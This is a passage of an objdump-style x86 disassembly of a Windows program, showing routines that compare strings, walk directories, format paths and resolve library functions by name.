  402590:	8b f0                	mov    %eax,%esi
  402592:	83 c4 10             	add    $0x10,%esp
  402595:	85 f6                	test   %esi,%esi
  402597:	74 30                	je     0x4025c9
  402599:	8b 2d 04 55 41 00    	mov    0x415504,%ebp
  40259f:	68 0c 01 42 00       	push   $0x42010c
  4025a4:	56                   	push   %esi
  4025a5:	ff d5                	call   *%ebp
  4025a7:	83 c4 08             	add    $0x8,%esp
  4025aa:	85 c0                	test   %eax,%eax
  4025ac:	74 0f                	je     0x4025bd
  4025ae:	68 fc 00 42 00       	push   $0x4200fc
  4025b3:	56                   	push   %esi
  4025b4:	ff d5                	call   *%ebp
  4025b6:	83 c4 08             	add    $0x8,%esp
  4025b9:	85 c0                	test   %eax,%eax
  4025bb:	75 0c                	jne    0x4025c9
  4025bd:	66 c7 06 00 00       	movw   $0x0,(%esi)
  4025c2:	bf 01 00 00 00       	mov    $0x1,%edi
  4025c7:	eb 13                	jmp    0x4025dc
  4025c9:	8d 54 24 14          	lea    0x14(%esp),%edx
  4025cd:	68 f0 00 42 00       	push   $0x4200f0
  4025d2:	52                   	push   %edx
  4025d3:	ff 15 54 55 41 00    	call   *0x415554
  4025d9:	83 c4 08             	add    $0x8,%esp
  4025dc:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  4025e0:	8d 44 24 14          	lea    0x14(%esp),%eax
  4025e4:	50                   	push   %eax
  4025e5:	53                   	push   %ebx
  4025e6:	e8 b5 fa ff ff       	call   0x4020a0
  4025eb:	85 c0                	test   %eax,%eax
  4025ed:	74 3a                	je     0x402629
  4025ef:	53                   	push   %ebx
  4025f0:	ff 15 b4 17 42 00    	call   *0x4217b4
  4025f6:	85 c0                	test   %eax,%eax
  4025f8:	74 3a                	je     0x402634
  4025fa:	85 ff                	test   %edi,%edi
  4025fc:	75 19                	jne    0x402617
  4025fe:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  402602:	53                   	push   %ebx
  402603:	51                   	push   %ecx
  402604:	ff 15 ac 17 42 00    	call   *0x4217ac
  40260a:	5f                   	pop    %edi
  40260b:	5e                   	pop    %esi
  40260c:	5d                   	pop    %ebp
  40260d:	5b                   	pop    %ebx
  40260e:	81 c4 d4 02 00 00    	add    $0x2d4,%esp
  402614:	c2 04 00             	ret    $0x4
  402617:	5f                   	pop    %edi
  402618:	5e                   	pop    %esi
  402619:	5d                   	pop    %ebp
  40261a:	b8 01 00 00 00       	mov    $0x1,%eax
  40261f:	5b                   	pop    %ebx
  402620:	81 c4 d4 02 00 00    	add    $0x2d4,%esp
  402626:	c2 04 00             	ret    $0x4
  402629:	8d 54 24 14          	lea    0x14(%esp),%edx
  40262d:	52                   	push   %edx
  40262e:	ff 15 b4 17 42 00    	call   *0x4217b4
  402634:	5f                   	pop    %edi
  402635:	5e                   	pop    %esi
  402636:	5d                   	pop    %ebp
  402637:	33 c0                	xor    %eax,%eax
  402639:	5b                   	pop    %ebx
  40263a:	81 c4 d4 02 00 00    	add    $0x2d4,%esp
  402640:	c2 04 00             	ret    $0x4
  402643:	90                   	nop
  402644:	90                   	nop
  402645:	90                   	nop
  402646:	90                   	nop
  402647:	90                   	nop
  402648:	90                   	nop
  402649:	90                   	nop
  40264a:	90                   	nop
  40264b:	90                   	nop
  40264c:	90                   	nop
  40264d:	90                   	nop
  40264e:	90                   	nop
  40264f:	90                   	nop
  402650:	81 ec d0 02 00 00    	sub    $0x2d0,%esp
  402656:	56                   	push   %esi
  402657:	8b f1                	mov    %ecx,%esi
  402659:	57                   	push   %edi
  40265a:	b9 b3 00 00 00       	mov    $0xb3,%ecx
  40265f:	33 c0                	xor    %eax,%eax
  402661:	8d 7c 24 0a          	lea    0xa(%esp),%edi
  402665:	66 c7 44 24 08 00 00 	movw   $0x0,0x8(%esp)
  40266c:	68 67 01 00 00       	push   $0x167
  402671:	f3 ab                	rep stos %eax,%es:(%edi)
  402673:	8b 8c 24 e0 02 00 00 	mov    0x2e0(%esp),%ecx
  40267a:	66 ab                	stos   %ax,%es:(%edi)
  40267c:	8d 44 24 0c          	lea    0xc(%esp),%eax
  402680:	50                   	push   %eax
  402681:	6a ff                	push   $0xffffffff
  402683:	51                   	push   %ecx
  402684:	6a 00                	push   $0x0
  402686:	6a 00                	push   $0x0
  402688:	ff 15 00 51 41 00    	call   *0x415100
  40268e:	8d 54 24 08          	lea    0x8(%esp),%edx
  402692:	8b ce                	mov    %esi,%ecx
  402694:	52                   	push   %edx
  402695:	e8 c6 fe ff ff       	call   0x402560
  40269a:	5f                   	pop    %edi
  40269b:	5e                   	pop    %esi
  40269c:	81 c4 d0 02 00 00    	add    $0x2d0,%esp
  4026a2:	c2 04 00             	ret    $0x4
  4026a5:	90                   	nop
  4026a6:	90                   	nop
  4026a7:	90                   	nop
  4026a8:	90                   	nop
  4026a9:	90                   	nop
  4026aa:	90                   	nop
  4026ab:	90                   	nop
  4026ac:	90                   	nop
  4026ad:	90                   	nop
  4026ae:	90                   	nop
  4026af:	90                   	nop
  4026b0:	6a ff                	push   $0xffffffff
  4026b2:	68 6e 35 41 00       	push   $0x41356e
  4026b7:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4026bd:	50                   	push   %eax
  4026be:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  4026c5:	81 ec 6c 05 00 00    	sub    $0x56c,%esp
  4026cb:	8a 44 24 03          	mov    0x3(%esp),%al
  4026cf:	53                   	push   %ebx
  4026d0:	55                   	push   %ebp
  4026d1:	33 db                	xor    %ebx,%ebx
  4026d3:	8b e9                	mov    %ecx,%ebp
  4026d5:	53                   	push   %ebx
  4026d6:	53                   	push   %ebx
  4026d7:	8d 4c 24 24          	lea    0x24(%esp),%ecx
  4026db:	88 44 24 24          	mov    %al,0x24(%esp)
  4026df:	e8 0c a2 00 00       	call   0x40c8f0
  4026e4:	89 44 24 20          	mov    %eax,0x20(%esp)
  4026e8:	89 5c 24 24          	mov    %ebx,0x24(%esp)
  4026ec:	8a 4c 24 0b          	mov    0xb(%esp),%cl
  4026f0:	53                   	push   %ebx
  4026f1:	88 4c 24 10          	mov    %cl,0x10(%esp)
  4026f5:	53                   	push   %ebx
  4026f6:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  4026fa:	89 9c 24 84 05 00 00 	mov    %ebx,0x584(%esp)
  402701:	e8 ea a1 00 00       	call   0x40c8f0
  402706:	89 44 24 10          	mov    %eax,0x10(%esp)
  40270a:	89 5c 24 14          	mov    %ebx,0x14(%esp)
  40270e:	8b 94 24 84 05 00 00 	mov    0x584(%esp),%edx
  402715:	8d 44 24 54          	lea    0x54(%esp),%eax
  402719:	52                   	push   %edx
  40271a:	68 b8 01 42 00       	push   $0x4201b8
  40271f:	50                   	push   %eax
  402720:	c6 84 24 88 05 00 00 	movb   $0x1,0x588(%esp)
  402727:	01 
  402728:	ff 15 70 55 41 00    	call   *0x415570
  40272e:	83 c4 0c             	add    $0xc,%esp
  402731:	8d 8c 24 24 03 00 00 	lea    0x324(%esp),%ecx
  402738:	8d 54 24 54          	lea    0x54(%esp),%edx
  40273c:	51                   	push   %ecx
  40273d:	52                   	push   %edx
  40273e:	ff 15 10 51 41 00    	call   *0x415110
  402744:	83 f8 ff             	cmp    $0xffffffff,%eax
  402747:	89 44 24 18          	mov    %eax,0x18(%esp)
  40274b:	75 67                	jne    0x4027b4
  40274d:	8b 44 24 10          	mov    0x10(%esp),%eax
  402751:	88 9c 24 7c 05 00 00 	mov    %bl,0x57c(%esp)
  402758:	50                   	push   %eax
  402759:	8b 08                	mov    (%eax),%ecx
  40275b:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  40275f:	51                   	push   %ecx
  402760:	50                   	push   %eax
  402761:	8d 4c 24 18          	lea    0x18(%esp),%ecx
  402765:	e8 96 06 00 00       	call   0x402e00
  40276a:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  40276e:	51                   	push   %ecx
  40276f:	e8 24 05 01 00       	call   0x412c98
  402774:	8b 44 24 24          	mov    0x24(%esp),%eax
  402778:	83 c4 04             	add    $0x4,%esp
  40277b:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  40277f:	89 5c 24 14          	mov    %ebx,0x14(%esp)
  402783:	8b 08                	mov    (%eax),%ecx
  402785:	50                   	push   %eax
  402786:	8d 54 24 2c          	lea    0x2c(%esp),%edx
  40278a:	51                   	push   %ecx
  40278b:	52                   	push   %edx
  40278c:	8d 4c 24 28          	lea    0x28(%esp),%ecx
  402790:	c7 84 24 88 05 00 00 	movl   $0xffffffff,0x588(%esp)
  402797:	ff ff ff ff 
  40279b:	e8 60 06 00 00       	call   0x402e00
  4027a0:	8b 44 24 20          	mov    0x20(%esp),%eax
  4027a4:	50                   	push   %eax
  4027a5:	e8 ee 04 01 00       	call   0x412c98
  4027aa:	83 c4 04             	add    $0x4,%esp
  4027ad:	33 c0                	xor    %eax,%eax
  4027af:	e9 1a 03 00 00       	jmp    0x402ace
  4027b4:	56                   	push   %esi
  4027b5:	8b 35 6c 55 41 00    	mov    0x41556c,%esi
  4027bb:	57                   	push   %edi
  4027bc:	8b 3d 58 55 41 00    	mov    0x415558,%edi
  4027c2:	8b 85 d0 04 00 00    	mov    0x4d0(%ebp),%eax
  4027c8:	3b c3                	cmp    %ebx,%eax
  4027ca:	74 08                	je     0x4027d4
  4027cc:	39 18                	cmp    %ebx,(%eax)
  4027ce:	0f 85 a4 01 00 00    	jne    0x402978
  4027d4:	8d 8c 24 58 03 00 00 	lea    0x358(%esp),%ecx
  4027db:	68 b4 01 42 00       	push   $0x4201b4
  4027e0:	51                   	push   %ecx
  4027e1:	ff d6                	call   *%esi
  4027e3:	83 c4 08             	add    $0x8,%esp
  4027e6:	85 c0                	test   %eax,%eax
  4027e8:	0f 84 6f 01 00 00    	je     0x40295d
  4027ee:	8d 94 24 58 03 00 00 	lea    0x358(%esp),%edx
  4027f5:	68 ac 01 42 00       	push   $0x4201ac
  4027fa:	52                   	push   %edx
  4027fb:	ff d6                	call   *%esi
  4027fd:	83 c4 08             	add    $0x8,%esp
  402800:	85 c0                	test   %eax,%eax
  402802:	0f 84 55 01 00 00    	je     0x40295d
  402808:	8b 8c 24 8c 05 00 00 	mov    0x58c(%esp),%ecx
  40280f:	8d 84 24 58 03 00 00 	lea    0x358(%esp),%eax
  402816:	50                   	push   %eax
  402817:	51                   	push   %ecx
  402818:	8d 54 24 64          	lea    0x64(%esp),%edx
  40281c:	68 a0 01 42 00       	push   $0x4201a0
  402821:	52                   	push   %edx
  402822:	ff 15 70 55 41 00    	call   *0x415570
  402828:	83 c4 10             	add    $0x10,%esp
  40282b:	8d 44 24 5c          	lea    0x5c(%esp),%eax
  40282f:	50                   	push   %eax
  402830:	ff 15 0c 51 41 00    	call   *0x41510c
  402836:	a8 10                	test   $0x10,%al
  402838:	74 7c                	je     0x4028b6
  40283a:	8d 8c 24 58 03 00 00 	lea    0x358(%esp),%ecx
  402841:	8d 54 24 5c          	lea    0x5c(%esp),%edx
  402845:	51                   	push   %ecx
  402846:	52                   	push   %edx
  402847:	8b cd                	mov    %ebp,%ecx
  402849:	e8 a2 02 00 00       	call   0x402af0
  40284e:	85 c0                	test   %eax,%eax
  402850:	0f 85 07 01 00 00    	jne    0x40295d
  402856:	8a 44 24 13          	mov    0x13(%esp),%al
  40285a:	53                   	push   %ebx
  40285b:	8d 4c 24 3c          	lea    0x3c(%esp),%ecx
  40285f:	88 44 24 3c          	mov    %al,0x3c(%esp)
  402863:	ff 15 b4 54 41 00    	call   *0x4154b4
  402869:	8d 4c 24 5c          	lea    0x5c(%esp),%ecx
  40286d:	51                   	push   %ecx
  40286e:	ff d7                	call   *%edi
  402870:	83 c4 04             	add    $0x4,%esp
  402873:	8d 54 24 5c          	lea    0x5c(%esp),%edx
  402877:	8d 4c 24 38          	lea    0x38(%esp),%ecx
  40287b:	50                   	push   %eax
  40287c:	52                   	push   %edx
  40287d:	ff 15 b0 54 41 00    	call   *0x4154b0
  402883:	8b 4c 24 28          	mov    0x28(%esp),%ecx
  402887:	8d 44 24 38          	lea    0x38(%esp),%eax
  40288b:	50                   	push   %eax
  40288c:	8d 54 24 34          	lea    0x34(%esp),%edx
  402890:	51                   	push   %ecx
  402891:	52                   	push   %edx
  402892:	8d 4c 24 30          	lea    0x30(%esp),%ecx
  402896:	c6 84 24 90 05 00 00 	movb   $0x2,0x590(%esp)
  40289d:	02 
  40289e:	e8 fd 04 00 00       	call   0x402da0
  4028a3:	c6 84 24 84 05 00 00 	movb   $0x1,0x584(%esp)
  4028aa:	01 
  4028ab:	6a 01                	push   $0x1
  4028ad:	8d 4c 24 3c          	lea    0x3c(%esp),%ecx
  4028b1:	e9 a1 00 00 00       	jmp    0x402957
  4028b6:	8d 84 24 58 03 00 00 	lea    0x358(%esp),%eax
  4028bd:	68 74 01 42 00       	push   $0x420174
  4028c2:	50                   	push   %eax
  4028c3:	ff d6                	call   *%esi
  4028c5:	83 c4 08             	add    $0x8,%esp
  4028c8:	85 c0                	test   %eax,%eax
  4028ca:	0f 84 8d 00 00 00    	je     0x40295d
  4028d0:	8d 8c 24 58 03 00 00 	lea    0x358(%esp),%ecx
  4028d7:	68 44 01 42 00       	push   $0x420144
  4028dc:	51                   	push   %ecx
  4028dd:	ff d6                	call   *%esi
  4028df:	83 c4 08             	add    $0x8,%esp
  4028e2:	85 c0                	test   %eax,%eax
  4028e4:	74 77                	je     0x40295d
  4028e6:	8d 94 24 58 03 00 00 	lea    0x358(%esp),%edx
  4028ed:	68 1c 01 42 00       	push   $0x42011c
  4028f2:	52                   	push   %edx
  4028f3:	ff d6                	call   *%esi
  4028f5:	83 c4 08             	add    $0x8,%esp
  4028f8:	85 c0                	test   %eax,%eax
  4028fa:	74 61                	je     0x40295d
  4028fc:	8a 44 24 13          	mov    0x13(%esp),%al
  402900:	53                   	push   %ebx
  402901:	8d 4c 24 4c          	lea    0x4c(%esp),%ecx
  402905:	88 44 24 4c          	mov    %al,0x4c(%esp)
  402909:	ff 15 b4 54 41 00    	call   *0x4154b4
  40290f:	8d 4c 24 5c          	lea    0x5c(%esp),%ecx
  402913:	51                   	push   %ecx
  402914:	ff d7                	call   *%edi
  402916:	83 c4 04             	add    $0x4,%esp
  402919:	8d 54 24 5c          	lea    0x5c(%esp),%edx
  40291d:	8d 4c 24 48          	lea    0x48(%esp),%ecx
  402921:	50                   	push   %eax
  402922:	52                   	push   %edx
  402923:	ff 15 b0 54 41 00    	call   *0x4154b0
  402929:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  40292d:	8d 44 24 48          	lea    0x48(%esp),%eax
  402931:	50                   	push   %eax
  402932:	8d 54 24 38          	lea    0x38(%esp),%edx
  402936:	51                   	push   %ecx
  402937:	52                   	push   %edx
  402938:	8d 4c 24 20          	lea    0x20(%esp),%ecx
  40293c:	c6 84 24 90 05 00 00 	movb   $0x3,0x590(%esp)
  402943:	03 
  402944:	e8 57 04 00 00       	call   0x402da0
  402949:	c6 84 24 84 05 00 00 	movb   $0x1,0x584(%esp)
  402950:	01 
  402951:	6a 01                	push   $0x1
  402953:	8d 4c 24 4c          	lea    0x4c(%esp),%ecx
  402957:	ff 15 b4 54 41 00    	call   *0x4154b4
  40295d:	8b 4c 24 20          	mov    0x20(%esp),%ecx
  402961:	8d 84 24 2c 03 00 00 	lea    0x32c(%esp),%eax
  402968:	50                   	push   %eax
  402969:	51                   	push   %ecx
  40296a:	ff 15 08 51 41 00    	call   *0x415108
  402970:	85 c0                	test   %eax,%eax
  402972:	0f 85 4a fe ff ff    	jne    0x4027c2
  402978:	8b 54 24 20          	mov    0x20(%esp),%edx
  40297c:	52                   	push   %edx
  40297d:	ff 15 04 51 41 00    	call   *0x415104
  402983:	8b 44 24 18          	mov    0x18(%esp),%eax
  402987:	8b 30                	mov    (%eax),%esi
  402989:	3b f0                	cmp    %eax,%esi
  40298b:	74 2c                	je     0x4029b9
  40298d:	8b 85 d0 04 00 00    	mov    0x4d0(%ebp),%eax
  402993:	3b c3                	cmp    %ebx,%eax
  402995:	74 04                	je     0x40299b
  402997:	39 18                	cmp    %ebx,(%eax)
  402999:	75 1e                	jne    0x4029b9
  40299b:	8b 46 0c             	mov    0xc(%esi),%eax
  40299e:	3b c3                	cmp    %ebx,%eax
  4029a0:	75 05                	jne    0x4029a7
  4029a2:	a1 d0 54 41 00       	mov    0x4154d0,%eax
  4029a7:	50                   	push   %eax
  4029a8:	8b cd                	mov    %ebp,%ecx
  4029aa:	e8 b1 fb ff ff       	call   0x402560
  4029af:	8b 36                	mov    (%esi),%esi
  4029b1:	8b 44 24 18          	mov    0x18(%esp),%eax
  4029b5:	3b f0                	cmp    %eax,%esi
  4029b7:	75 d4                	jne    0x40298d
  4029b9:	8b 44 24 28          	mov    0x28(%esp),%eax
  4029bd:	8b 30                	mov    (%eax),%esi
  4029bf:	3b f0                	cmp    %eax,%esi
  4029c1:	74 2c                	je     0x4029ef
  4029c3:	8b 85 d0 04 00 00    	mov    0x4d0(%ebp),%eax
  4029c9:	3b c3                	cmp    %ebx,%eax
  4029cb:	74 04                	je     0x4029d1
  4029cd:	39 18                	cmp    %ebx,(%eax)
  4029cf:	75 1e                	jne    0x4029ef
  4029d1:	8b 46 0c             	mov    0xc(%esi),%eax
  4029d4:	3b c3                	cmp    %ebx,%eax
  4029d6:	75 05                	jne    0x4029dd
  4029d8:	a1 d0 54 41 00       	mov    0x4154d0,%eax
  4029dd:	50                   	push   %eax
  4029de:	8b cd                	mov    %ebp,%ecx
  4029e0:	e8 cb fc ff ff       	call   0x4026b0
  4029e5:	8b 36                	mov    (%esi),%esi
  4029e7:	8b 44 24 28          	mov    0x28(%esp),%eax
  4029eb:	3b f0                	cmp    %eax,%esi
  4029ed:	75 d4                	jne    0x4029c3
  4029ef:	8b b4 24 8c 05 00 00 	mov    0x58c(%esp),%esi
  4029f6:	8b 3d 70 55 41 00    	mov    0x415570,%edi
  4029fc:	68 74 01 42 00       	push   $0x420174
  402a01:	56                   	push   %esi
  402a02:	8d 44 24 64          	lea    0x64(%esp),%eax
  402a06:	68 a0 01 42 00       	push   $0x4201a0
  402a0b:	50                   	push   %eax
  402a0c:	ff d7                	call   *%edi
  402a0e:	83 c4 10             	add    $0x10,%esp
  402a11:	8d 4c 24 5c          	lea    0x5c(%esp),%ecx
  402a15:	51                   	push   %ecx
  402a16:	ff 15 b4 17 42 00    	call   *0x4217b4
  402a1c:	68 44 01 42 00       	push   $0x420144
  402a21:	56                   	push   %esi
  402a22:	8d 54 24 64          	lea    0x64(%esp),%edx
  402a26:	68 a0 01 42 00       	push   $0x4201a0
  402a2b:	52                   	push   %edx
  402a2c:	ff d7                	call   *%edi
  402a2e:	83 c4 10             	add    $0x10,%esp
  402a31:	8d 44 24 5c          	lea    0x5c(%esp),%eax
  402a35:	50                   	push   %eax
  402a36:	ff 15 b4 17 42 00    	call   *0x4217b4
  402a3c:	8b 44 24 18          	mov    0x18(%esp),%eax
  402a40:	88 9c 24 84 05 00 00 	mov    %bl,0x584(%esp)
  402a47:	8b f8                	mov    %eax,%edi
  402a49:	8b 30                	mov    (%eax),%esi
  402a4b:	3b f0                	cmp    %eax,%esi
  402a4d:	74 1b                	je     0x402a6a
  402a4f:	8b c6                	mov    %esi,%eax
  402a51:	8b 36                	mov    (%esi),%esi
  402a53:	8d 4c 24 34          	lea    0x34(%esp),%ecx
  402a57:	50                   	push   %eax
  402a58:	51                   	push   %ecx
  402a59:	8d 4c 24 1c          	lea    0x1c(%esp),%ecx
  402a5d:	e8 2e 04 00 00       	call   0x402e90
  402a62:	3b f7                	cmp    %edi,%esi
  402a64:	75 e9                	jne    0x402a4f
  402a66:	8b 44 24 18          	mov    0x18(%esp),%eax
  402a6a:	50                   	push   %eax
  402a6b:	e8 28 02 01 00       	call   0x412c98
  402a70:	8b 74 24 2c          	mov    0x2c(%esp),%esi
  402a74:	89 5c 24 1c          	mov    %ebx,0x1c(%esp)
  402a78:	89 5c 24 20          	mov    %ebx,0x20(%esp)
  402a7c:	83 c4 04             	add    $0x4,%esp
  402a7f:	8b 06                	mov    (%esi),%eax
  402a81:	c7 84 24 84 05 00 00 	movl   $0xffffffff,0x584(%esp)
  402a88:	ff ff ff ff 
  402a8c:	3b c6                	cmp    %esi,%eax
  402a8e:	89 44 24 20          	mov    %eax,0x20(%esp)
  402a92:	74 26                	je     0x402aba
  402a94:	8d 54 24 34          	lea    0x34(%esp),%edx
  402a98:	53                   	push   %ebx
  402a99:	52                   	push   %edx
  402a9a:	8d 4c 24 28          	lea    0x28(%esp),%ecx
  402a9e:	e8 ed 02 00 00       	call   0x402d90
  402aa3:	8b 00                	mov    (%eax),%eax
  402aa5:	8d 4c 24 58          	lea    0x58(%esp),%ecx
  402aa9:	50                   	push   %eax
  402aaa:	51                   	push   %ecx
  402aab:	8d 4c 24 2c          	lea    0x2c(%esp),%ecx
  402aaf:	e8 dc 03 00 00       	call   0x402e90
  402ab4:	39 74 24 20          	cmp    %esi,0x20(%esp)
  402ab8:	75 da                	jne    0x402a94
  402aba:	8b 54 24 28          	mov    0x28(%esp),%edx
  402abe:	52                   	push   %edx
  402abf:	e8 d4 01 01 00       	call   0x412c98
  402ac4:	83 c4 04             	add    $0x4,%esp
  402ac7:	b8 01 00 00 00       	mov    $0x1,%eax
  402acc:	5f                   	pop    %edi
  402acd:	5e                   	pop    %esi
  402ace:	8b 8c 24 74 05 00 00 	mov    0x574(%esp),%ecx
  402ad5:	5d                   	pop    %ebp
  402ad6:	5b                   	pop    %ebx
  402ad7:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  402ade:	81 c4 78 05 00 00    	add    $0x578,%esp
  402ae4:	c2 04 00             	ret    $0x4
  402ae7:	90                   	nop
  402ae8:	90                   	nop
  402ae9:	90                   	nop
  402aea:	90                   	nop
  402aeb:	90                   	nop
  402aec:	90                   	nop
  402aed:	90                   	nop
  402aee:	90                   	nop
  402aef:	90                   	nop
  402af0:	53                   	push   %ebx
  402af1:	56                   	push   %esi
  402af2:	8b 74 24 0c          	mov    0xc(%esp),%esi
  402af6:	57                   	push   %edi
  402af7:	6a 02                	push   $0x2
  402af9:	68 94 03 42 00       	push   $0x420394
  402afe:	56                   	push   %esi
  402aff:	ff 15 00 55 41 00    	call   *0x415500
  402b05:	8b 1d 74 55 41 00    	mov    0x415574,%ebx
  402b0b:	83 c4 0c             	add    $0xc,%esp
  402b0e:	85 c0                	test   %eax,%eax
  402b10:	75 0d                	jne    0x402b1f
  402b12:	68 8c 03 42 00       	push   $0x42038c
  402b17:	56                   	push   %esi
  402b18:	ff d3                	call   *%ebx
  402b1a:	83 c4 08             	add    $0x8,%esp
  402b1d:	eb 03                	jmp    0x402b22
  402b1f:	8d 46 02             	lea    0x2(%esi),%eax
  402b22:	8b 3d 04 55 41 00    	mov    0x415504,%edi
  402b28:	85 c0                	test   %eax,%eax
  402b2a:	0f 84 b9 00 00 00    	je     0x402be9
  402b30:	8d 70 02             	lea    0x2(%eax),%esi
  402b33:	68 7c 03 42 00       	push   $0x42037c
  402b38:	56                   	push   %esi
  402b39:	ff d7                	call   *%edi
  402b3b:	83 c4 08             	add    $0x8,%esp
  402b3e:	85 c0                	test   %eax,%eax
  402b40:	75 0b                	jne    0x402b4d
  402b42:	5f                   	pop    %edi
  402b43:	5e                   	pop    %esi
  402b44:	b8 01 00 00 00       	mov    $0x1,%eax
  402b49:	5b                   	pop    %ebx
  402b4a:	c2 08 00             	ret    $0x8
  402b4d:	68 60 03 42 00       	push   $0x420360
  402b52:	56                   	push   %esi
  402b53:	ff d7                	call   *%edi
  402b55:	83 c4 08             	add    $0x8,%esp
  402b58:	85 c0                	test   %eax,%eax
  402b5a:	75 0b                	jne    0x402b67
  402b5c:	5f                   	pop    %edi
  402b5d:	5e                   	pop    %esi
  402b5e:	b8 01 00 00 00       	mov    $0x1,%eax
  402b63:	5b                   	pop    %ebx
  402b64:	c2 08 00             	ret    $0x8
  402b67:	68 4c 03 42 00       	push   $0x42034c
  402b6c:	56                   	push   %esi
  402b6d:	ff d7                	call   *%edi
  402b6f:	83 c4 08             	add    $0x8,%esp
  402b72:	85 c0                	test   %eax,%eax
  402b74:	75 0b                	jne    0x402b81
  402b76:	5f                   	pop    %edi
  402b77:	5e                   	pop    %esi
  402b78:	b8 01 00 00 00       	mov    $0x1,%eax
  402b7d:	5b                   	pop    %ebx
  402b7e:	c2 08 00             	ret    $0x8
  402b81:	68 2c 03 42 00       	push   $0x42032c
  402b86:	56                   	push   %esi
  402b87:	ff d7                	call   *%edi
  402b89:	83 c4 08             	add    $0x8,%esp
  402b8c:	85 c0                	test   %eax,%eax
  402b8e:	75 0b                	jne    0x402b9b
  402b90:	5f                   	pop    %edi
  402b91:	5e                   	pop    %esi
  402b92:	b8 01 00 00 00       	mov    $0x1,%eax
  402b97:	5b                   	pop    %ebx
  402b98:	c2 08 00             	ret    $0x8
  402b9b:	68 00 03 42 00       	push   $0x420300
  402ba0:	56                   	push   %esi
  402ba1:	ff d7                	call   *%edi
  402ba3:	83 c4 08             	add    $0x8,%esp
  402ba6:	85 c0                	test   %eax,%eax
  402ba8:	75 0b                	jne    0x402bb5
  402baa:	5f                   	pop    %edi
  402bab:	5e                   	pop    %esi
  402bac:	b8 01 00 00 00       	mov    $0x1,%eax
  402bb1:	5b                   	pop    %ebx
  402bb2:	c2 08 00             	ret    $0x8
  402bb5:	68 d8 02 42 00       	push   $0x4202d8
  402bba:	56                   	push   %esi
  402bbb:	ff d3                	call   *%ebx
  402bbd:	83 c4 08             	add    $0x8,%esp
  402bc0:	85 c0                	test   %eax,%eax
  402bc2:	74 0b                	je     0x402bcf
  402bc4:	5f                   	pop    %edi
  402bc5:	5e                   	pop    %esi
  402bc6:	b8 01 00 00 00       	mov    $0x1,%eax
  402bcb:	5b                   	pop    %ebx
  402bcc:	c2 08 00             	ret    $0x8
  402bcf:	68 ac 02 42 00       	push   $0x4202ac
  402bd4:	56                   	push   %esi
  402bd5:	ff d3                	call   *%ebx
  402bd7:	83 c4 08             	add    $0x8,%esp
  402bda:	85 c0                	test   %eax,%eax
  402bdc:	74 0b                	je     0x402be9
  402bde:	5f                   	pop    %edi
  402bdf:	5e                   	pop    %esi
  402be0:	b8 01 00 00 00       	mov    $0x1,%eax
  402be5:	5b                   	pop    %ebx
  402be6:	c2 08 00             	ret    $0x8
  402be9:	8b 74 24 14          	mov    0x14(%esp),%esi
  402bed:	68 10 02 42 00       	push   $0x420210
  402bf2:	56                   	push   %esi
  402bf3:	ff d7                	call   *%edi
  402bf5:	83 c4 08             	add    $0x8,%esp
  402bf8:	85 c0                	test   %eax,%eax
  402bfa:	75 0b                	jne    0x402c07
  402bfc:	5f                   	pop    %edi
  402bfd:	5e                   	pop    %esi
  402bfe:	b8 01 00 00 00       	mov    $0x1,%eax
  402c03:	5b                   	pop    %ebx
  402c04:	c2 08 00             	ret    $0x8
  402c07:	68 dc 01 42 00       	push   $0x4201dc
  402c0c:	56                   	push   %esi
  402c0d:	ff d7                	call   *%edi
  402c0f:	83 c4 08             	add    $0x8,%esp
  402c12:	85 c0                	test   %eax,%eax
  402c14:	75 0b                	jne    0x402c21
  402c16:	5f                   	pop    %edi
  402c17:	5e                   	pop    %esi
  402c18:	b8 01 00 00 00       	mov    $0x1,%eax
  402c1d:	5b                   	pop    %ebx
  402c1e:	c2 08 00             	ret    $0x8
  402c21:	68 c4 01 42 00       	push   $0x4201c4
  402c26:	56                   	push   %esi
  402c27:	ff d7                	call   *%edi
  402c29:	83 c4 08             	add    $0x8,%esp
  402c2c:	f7 d8                	neg    %eax
  402c2e:	1b c0                	sbb    %eax,%eax
  402c30:	5f                   	pop    %edi
  402c31:	5e                   	pop    %esi
  402c32:	40                   	inc    %eax
  402c33:	5b                   	pop    %ebx
  402c34:	c2 08 00             	ret    $0x8
  402c37:	90                   	nop
  402c38:	90                   	nop
  402c39:	90                   	nop
  402c3a:	90                   	nop
  402c3b:	90                   	nop
  402c3c:	90                   	nop
  402c3d:	90                   	nop
  402c3e:	90                   	nop
  402c3f:	90                   	nop
  402c40:	56                   	push   %esi
  402c41:	e8 2a 1f 00 00       	call   0x404b70
  402c46:	85 c0                	test   %eax,%eax
  402c48:	0f 84 cf 00 00 00    	je     0x402d1d
  402c4e:	a1 a0 17 42 00       	mov    0x4217a0,%eax
  402c53:	85 c0                	test   %eax,%eax
  402c55:	74 07                	je     0x402c5e
  402c57:	b8 01 00 00 00       	mov    $0x1,%eax
  402c5c:	5e                   	pop    %esi
  402c5d:	c3                   	ret
  402c5e:	68 f0 03 42 00       	push   $0x4203f0
  402c63:	ff 15 dc 50 41 00    	call   *0x4150dc
  402c69:	8b f0                	mov    %eax,%esi
  402c6b:	85 f6                	test   %esi,%esi
  402c6d:	0f 84 aa 00 00 00    	je     0x402d1d
  402c73:	57                   	push   %edi
  402c74:	8b 3d c0 50 41 00    	mov    0x4150c0,%edi
  402c7a:	68 e4 03 42 00       	push   $0x4203e4
  402c7f:	56                   	push   %esi
  402c80:	ff d7                	call   *%edi
  402c82:	68 d8 03 42 00       	push   $0x4203d8
  402c87:	56                   	push   %esi
  402c88:	a3 a0 17 42 00       	mov    %eax,0x4217a0
  402c8d:	ff d7                	call   *%edi
  402c8f:	68 cc 03 42 00       	push   $0x4203cc
  402c94:	56                   	push   %esi
  402c95:	a3 a4 17 42 00       	mov    %eax,0x4217a4
  402c9a:	ff d7                	call   *%edi
  402c9c:	68 c0 03 42 00       	push   $0x4203c0
  402ca1:	56                   	push   %esi
  402ca2:	a3 a8 17 42 00       	mov    %eax,0x4217a8
  402ca7:	ff d7                	call   *%edi
  402ca9:	68 b4 03 42 00       	push   $0x4203b4
